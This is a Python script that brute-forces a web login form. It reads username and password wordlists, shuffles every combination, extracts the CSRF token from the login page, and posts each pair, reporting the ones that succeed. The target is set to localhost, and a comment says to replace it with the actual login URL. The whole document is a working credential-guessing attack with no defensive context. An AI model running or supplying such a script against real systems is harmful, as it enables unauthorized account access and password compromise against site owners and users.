import requests
from bs4 import BeautifulSoup
import itertools
import random

# URLs
login_url = 'http://127.0.0.1:8000/login/'  # Replace with the actual login URL

# File paths
username_file = '../resources/usernames.txt'
password_file = '../resources/passwords.txt'

def get_csrf_token(session, url):
    """Fetch the login page and extract the CSRF token."""
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
    return token

def attempt_login(session, url, username, password, csrf_token):
    data = {
        'username': username,
        'password': password,
        'csrfmiddlewaretoken': csrf_token
    }
    response = session.post(url, data=data)
    # Check the response to determine if the login was successful
    if "Welcome to the Home Page" in response.text:  # Adjust based on your server's response
        print(f"Successful login with {username}:{password}")
        return True
    else:
        print(f"Failed login with {username}:{password}")
        return False

def main():
    # Start a session to persist cookies
    session = requests.Session()
    # After each login attempt, fetch a new token
    csrf_token = get_csrf_token(session, login_url)

    # Read usernames and passwords
    with open(username_file) as u_file, open(password_file) as p_file:
        usernames = u_file.read().splitlines()
        passwords = p_file.read().splitlines()

    # Generate all possible combinations and shuffle them for randomness
    combinations = list(itertools.product(usernames, passwords))
    random.shuffle(combinations)

    # Iterate over shuffled username and password pairs
    for username, password in combinations:
        if attempt_login(session, login_url, username, password, csrf_token):
        # Fetch a new CSRF token after each login attempt
            csrf_token = get_csrf_token(session, login_url)

if __name__ == '__main__':
    main()
